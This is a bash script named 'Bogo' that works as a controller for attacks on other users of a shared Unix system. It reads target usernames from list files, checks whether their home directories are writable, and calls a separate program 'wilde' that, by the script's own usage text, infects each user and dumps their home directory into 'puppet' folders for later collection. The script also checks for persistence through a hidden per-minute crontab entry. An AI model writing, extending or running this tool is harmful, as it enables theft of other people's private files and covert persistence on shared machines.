#!/bin/bash
# Bogo

header="BOGO v1.1\nProperty of Michael Talon\n"

# Make sure these are hardcoded to YOUR home directory
# If you run this as root, it will treat ~ as /home/root

base=/home/penchant81718/zpd  # Bogo's working directory
puppets=$base/puppets.bogo    # Location of the puppets list
target_list=$base/targets.d   # Location of target files
wilde=$base/wilde             # Location of wilde

onfail=continue               # Set to 'retry' if you want bogo to
                              # continuously hit target if it is locked


VarCheck(){
	# Make sure our constants actually exist
	if [[ ! -e $1 ]]; then
		echo "My constants are not set correctly..."
		Error fatal "$1 does not exist"
	fi
}
NameTargets(){
	# Parse the filename for the target files, and extract usernames
	# from them
	if [[ -e $base/_bogo.tmp ]]; then
		rm $base/_bogo.tmp
		touch $base/_bogo.tmp
	fi
	local i=0
	local m=0
	local j=0
	local c=0
	potarg=$(ls $target_list)
	for m in $potarg; do
		l=${m%_*}
		j=${m##*_}
		k=${j#*.}
		o=${j%.*o}
		if [[ $l = "targets" ]] && [[ $k == "bogo" ]]; then
			PathCheck $target_list/$m
			cat $target_list/$m >> $base/_bogo.tmp
		fi
	done
	ReadFile $base/_bogo.tmp
}

PathCheck(){
	# Check if a path exists and we can actually read it
	if [[ ! -e $1 ]]; then
		Error fatal "Can't find $1"
	elif [[ ! -r $1 ]]; then
		Error fatal "Denied read access to $1"
	else
		echo "Found $1"
	fi
}

Error(){
	# Prints an error message, terminate if fatal
	case "$1" in
		"warn") echo "WARNING: $2";;
		"fatal") echo "FATAL: $2"
						 echo -ne "\nABORTING\n"
						 exit 1;;
		"note") echo "NOTE: $2";;
		*) echo -ne "\nBUG: Errorception \n1: $1 \n2: $2\n"
			 exit 69;;
	esac
}

ReadFile(){
	# Confirms our puppets and targets are accessable
	while IFS='' read -r line || [[ -n "$line" ]]; do
		if [[ $1 == $puppets ]]; then
			CheckPuppet $line
		else
			if [[ -d /home/$line ]]; then
				targets_go[$i]=$line
				((i++))
			fi
		fi
	done < "$1"
}

CheckPuppet(){
	# Can we write to our puppet?
	if [[ -w $1 ]]; then
			echo "Puppet $1 is UP"
		puppets_go[$n]=$1
		((n++))
	else
			echo "Puppet $1 is DOWN"
	fi
}

CountWilde(){
	present=0
	active=0
	if [[ "$(id -u)" != "0" ]]; then
		Error note "Must have root privledges to find wilde"
	else
		for file in $1/*; do
			if [[ -e $file/._/.wilde ]]; then
				((present++))
				if [[ $(crontab -u ${file##$scope/} -l) == *"* * * * ~/._/.wilde"* ]]; then
					((active++))
				fi
			fi
		done
	fi
}

WildeSanityCheck(){
	# Checks if wilde will actually execute AND TERMINATE properly
	# Until finished, just cross your fingers that wilde doesnt loop
	# endlessly
	#$wilde dl $base/wilde.cfg
	return 0
}

Usage(){
	echo "Usage: bogo [ACTION]"
	echo "Where ACTION is either hit or sync-puppets"
	echo ""
	echo "Last edits were made March 28th"
	echo "This script is still in development and should be considered"
	echo "DANGEROUS. Use at your own risk"                                        
	echo "-------------------------------------------------------------"
	echo ""
	echo "Bogo creates a directory ('zpd' by default) to put all its"
	echo "related files into. You should put everything related to this"
	echo "script in there before executing to simplify things"
	echo ""
	echo "Bogo needs 3 things to operate:"
	echo "wilde        ->   Performs the attack"
	echo ""
	echo "puppets.bogo ->   List of directories that wilde dumps his"
	echo "                  stash to"
	echo ""
	echo "targets.d    ->   Directory that contains text files that"
	echo "                  contain the users whom Bogo should infect"
	echo ""
	echo "                  These files MUST be in the form of"
	echo "                  \"targets_YourNameHere.bogo\" or Bogo"
	echo "                  will ignore them"
	echo ""
	echo "                  I recommend sorting users by nation, so"
	echo "                  for example we would create a file here"
	echo "                  called \"targets_NorthFairfaxia.bogo\" and"
	echo "                  in that file list the users of that nation"
	echo ""
	echo "puppets.bogo should contain HARDLINKS of where you want the"
	echo "files to be stored"
	echo ""
	echo "NO SANITY CHECKS ARE PERFORMED ON THE CONTENTS OF THOSE FILES"
	echo "So make sure they are valid and that there ARE NO EMPTY LINES"
	echo ""
	echo "Right now there are only 2 ACTIONS:"
	echo ""
	echo "hit --------------------------------------------------------"
	echo "Attempts to hit victims listed in targets.bogo."
	echo ""
	echo "If bogo cant write to it, he waits 2 seconds and keeps retrying"
	echo "until he can or you abort with ^C"
	echo ""
	echo "If bogo can write to the target, he then executes wilde who then"
	echo "infects the user and dumps the contents of their home directory"
	echo "into the folder(s) listed in 'puppets.bogo'"
	echo ""
	echo "** DO NOT invoke wilde directly - HE WILL INFECT YOU **"
	echo ""
	echo "sync-puppets ---------------------------------------------"
	echo "Moves the contents of the the puppets in puppets.bogo into"
	echo "Bogo's working directory in your home"
	echo ""
}

SyncPuppets(){
	# Moves wilde's stash from the puppet accounts into Bogo's working 
	# directory
	PathCheck $puppets
	ReadFile $puppets
	if [ ${#puppets_go[@]} -eq 0 ]; then
		Error warn "There aren't puppets to sync!"
	else
		echo -ne "Synchronizing stash... "
		for j in "${puppets_go[@]}"; do
			mv -f $j/* $base/stash
		done
		echo -ne "  ok\n"
	fi
}

Hit(){
	# Where the fun begins
	local numyay=0
	local numboo=0
	NameTargets
	if [ ${#targets_go[@]} -eq 0 ]; then
		Error fatal "I dont have any targets!"
	fi
	PathCheck $puppets
	PathCheck $wilde
	ReadFile $puppets
	rm -f $base/_bogo.tmp
	echo -ne "\nReady to hit ${#targets_go[@]} target(s)\n"
	echo -ne "Press enter to continue - or Control+C to abort"
	read a1
	for k in "${targets_go[@]}"; do
		if [[ ! -w /home/$k ]]; then
			if [[ $onfail == "retry" ]]; then
				while [[ ! -w /home/$k ]]; do
					echo "$(date +%I-%M-%S): $k is locked - retrying in 2 seconds"
					sleep 2
				done
			else
				echo "$k is locked, moving on"
			fi
		else
			echo -ne "\n------------- ATTEMPTING TO BREACH $k ------------- \n"
			touch $base/wilde.cfg
			echo "pl=(${puppets_go[@]})" >> $base/wilde.cfg
			echo "tl=$k" >> $base/wilde.cfg
			echo "el=$base" >> $base/wilde.cfg
			echo "Generated wilde's OTP"
			$wilde st $base/wilde.cfg
			if [[ $? == 0 ]]; then
				echo "Wilde is sane"
			else
				Error fatal "Wilde failed sanity check (code $?)"
			fi
			echo -ne "\nInfiltrating target - waiting for response...\n"
			$wilde dt $base/wilde.cfg
			if [[ $? == 0 ]]; then
				echo "Wilde reported success!"
				((numyay++))
				echo "--------------------------------------------------------------"
			else
				Error warn "Wilde's execution failed (code $?)"
				((numboo++))
				echo "--------------------------------------------------------------"
			fi
			rm $base/wilde.cfg
		fi
	done
	
	echo -ne "\nSuccessfully infiltrated $numyay target(s)\n"
}

clear
VarCheck $base
VarCheck $puppets
VarCheck $target_list
VarCheck $wilde

echo -ne "$header\n"
if [[ ! -e $base ]]; then
	echo "Creating $base"
	mkdir $base
fi

if [[ -e $base/wilde.cfg ]]; then
	rm -f $base/wilde.cfg
	echo "Deleted butchered wilde.cfg"
fi

case $1 in
	sync-puppets) SyncPuppets;;
	hit) Hit;;
	*) Usage;;
esac
